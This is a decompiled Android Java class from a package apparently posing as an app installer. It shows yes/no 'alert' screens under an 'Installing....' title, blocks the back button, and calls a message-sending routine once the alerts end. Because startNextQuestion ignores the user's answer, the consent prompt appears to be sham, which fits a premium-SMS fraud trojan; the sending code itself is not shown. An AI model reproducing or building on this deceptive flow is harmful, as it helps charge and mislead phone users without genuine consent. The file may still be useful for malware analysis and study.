package com.soft.android.appinstaller;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.text.method.ScrollingMovementMethod;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import com.soft.android.appinstaller.core.Internals;
import com.soft.android.appinstaller.core.SmsInfo;

public class QuestionActivity
  extends Activity
{
  private Button buttonNo;
  private Button buttonYes;
  
  public QuestionActivity() {}
  
  public static void checkNextQuestions(Context paramContext, Activity paramActivity)
  {
    if (FlowController.getCurrentAlertID() != -1)
    {
      paramActivity.startActivityForResult(new Intent(paramContext, QuestionActivity.class), 0);
      paramActivity.finish();
      return;
    }
    FlowController.sendMessages(paramContext, paramActivity);
  }
  
  public void onCreate(Bundle paramBundle)
  {
    Log.v("log", "QuestionActivity onCreate");
    super.onCreate(paramBundle);
    setContentView(2130903043);
    GlobalConfig.getInstance().init(this);
    OpInfo.getInstance().init(this);
    this.buttonYes = ((Button)findViewById(2131165203));
    this.buttonNo = ((Button)findViewById(2131165202));
    this.buttonYes.setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("ui.alertscreen.buttons.yes.caption", this.buttonYes.getText().toString()));
    this.buttonNo.setText(OpInfo.getInstance().getInternals().getOverridableValueForLocation("ui.alertscreen.buttons.no.caption", this.buttonNo.getText().toString()));
    paramBundle = (TextView)findViewById(2131165200);
    int i = FlowController.getCurrentAlertID();
    if (i != -1)
    {
      paramBundle.setText(OpInfo.getInstance().getInternals().getSmsInfo().getAlert(i));
      paramBundle.setMovementMethod(new ScrollingMovementMethod());
      setTitle("Установка....");
    }
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if (paramInt == 4) {
      return true;
    }
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  public void onNoClicked(View paramView)
  {
    Log.v("log", "Exit");
    OpInfo.getInstance().getInternals().getSmsInfo().setAlertResult(FlowController.getCurrentAlertID(), false);
    FlowController.increaseCurrentAlertID();
    startNextQuestion(paramView, false);
    finish();
  }
  
  public void onYesClicked(View paramView)
  {
    Log.v("log", "Next");
    OpInfo.getInstance().getInternals().getSmsInfo().setAlertResult(FlowController.getCurrentAlertID(), true);
    FlowController.increaseCurrentAlertID();
    startNextQuestion(paramView, true);
    finish();
  }
  
  public void startNextQuestion(View paramView, boolean paramBoolean)
  {
    if (paramBoolean) {}
    checkNextQuestions(paramView.getContext(), this);
  }
}
